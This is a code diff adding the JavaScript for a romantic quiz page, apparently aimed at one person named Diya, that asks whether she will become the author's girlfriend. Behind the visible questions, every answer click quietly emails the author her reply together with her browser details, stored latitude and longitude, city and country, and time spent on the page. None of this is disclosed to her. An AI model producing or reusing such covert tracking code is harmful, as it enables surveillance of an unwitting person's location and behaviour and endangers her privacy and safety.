@@ -1,0 +1,233 @@
+// ===================================
+// PROJECT DIYA V3
+// QUESTIONS PAGE
+// ===================================
+
+const questions = [
+
+    "Are you happy with me? ❤️",
+
+    "Kya main tumhari life ka special person hoon? 🥹❤️",
+
+    "Will you be my girlfriend from today? ❤️🥹"
+
+];
+
+let currentQuestion = 0;
+const answers = [];
+
+// ===============================
+// Device Information
+// ===============================
+
+const startTime = Date.now();
+
+const deviceInfo = {
+    browser: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language
+};
+
+const savedLocation = JSON.parse(
+    localStorage.getItem("userLocation") || "{}"
+);
+
+// ===============================
+// Email Notification
+// ===============================
+
+function sendNotification(question, answer) {
+
+    emailjs.send(
+        "service_9pgx1er",
+        "template_90o54vp",
+        {
+    question: question,
+    answer: answer,
+    time: new Date().toLocaleString(),
+
+    browser: deviceInfo.browser,
+    platform: deviceInfo.platform,
+    language: deviceInfo.language,
+
+    latitude: savedLocation.latitude || "Not Allowed",
+    longitude: savedLocation.longitude || "Not Allowed",
+    accuracy: savedLocation.accuracy || "-",
+
+    city: savedLocation.city || "Unknown",
+state: savedLocation.state || "Unknown",
+country: savedLocation.country || "Unknown",
+
+    location_status: savedLocation.status || "Not Allowed",
+
+    time_spent:
+        Math.floor((Date.now() - startTime) / 1000) + " seconds"
+}
+    )
+    .then(() => {
+        console.log("Notification Sent");
+    })
+    .catch((error) => {
+        console.error(error);
+    });
+
+}
+
+// Elements
+const questionNumber = document.getElementById("questionNumber");
+const questionText = document.getElementById("questionText");
+const progressBar = document.getElementById("progressBar");
+
+const yesBtn = document.querySelector(".yes");
+const noBtn = document.querySelector(".no");
+const skipBtn = document.querySelector(".skip");
+
+// ----------------------------
+// Load Question
+// ----------------------------
+
+function loadQuestion() {
+
+    questionNumber.innerHTML =
+        `Question ${currentQuestion + 1} / ${questions.length}`;
+
+    questionText.innerHTML =
+        questions[currentQuestion];
+
+    progressBar.style.width =
+        ((currentQuestion + 1) / questions.length) * 100 + "%";
+
+}
+
+// ----------------------------
+// Button Animation
+// ----------------------------
+
+function animateCard(callback){
+
+    gsap.to(".question-card",{
+
+        opacity:0,
+
+        y:30,
+
+        duration:0.25,
+
+        onComplete:()=>{
+
+            callback();
+
+            gsap.fromTo(".question-card",
+
+                {
+
+                    opacity:0,
+
+                    y:-30
+
+                },
+
+                {
+
+                    opacity:1,
+
+                    y:0,
+
+                    duration:0.4
+
+                }
+
+            );
+
+        }
+
+    });
+
+}
+
+// ----------------------------
+// Next Question
+// ----------------------------
+
+function answerClicked(answer){
+
+    answers.push({
+
+        question:questions[currentQuestion],
+
+        answer:answer,
+
+        time:new Date().toLocaleString()
+
+    });
+
+    sendNotification(
+    questions[currentQuestion],
+    answer
+);
+
+    currentQuestion++;
+
+    if(currentQuestion<questions.length){
+
+        animateCard(loadQuestion);
+
+    }
+
+    else{
+
+        localStorage.setItem(
+
+            "diya_answers",
+
+            JSON.stringify(answers)
+
+        );
+
+        gsap.to("body",{
+
+            opacity:0,
+
+            duration:0.8,
+
+            onComplete:()=>{
+
+                window.location.href="/gift";
+
+            }
+
+        });
+
+    }
+
+}
+
+// ----------------------------
+// Events
+// ----------------------------
+
+yesBtn.addEventListener("click",()=>{
+
+    answerClicked("YES ❤️");
+
+});
+
+noBtn.addEventListener("click",()=>{
+
+    answerClicked("NO 💔");
+
+});
+
+skipBtn.addEventListener("click",()=>{
+
+    answerClicked("SKIP ⏭");
+
+});
+
+// ----------------------------
+// Start
+// ----------------------------
+
+loadQuestion();
+
+console.log("❤️ Questions Page Loaded");
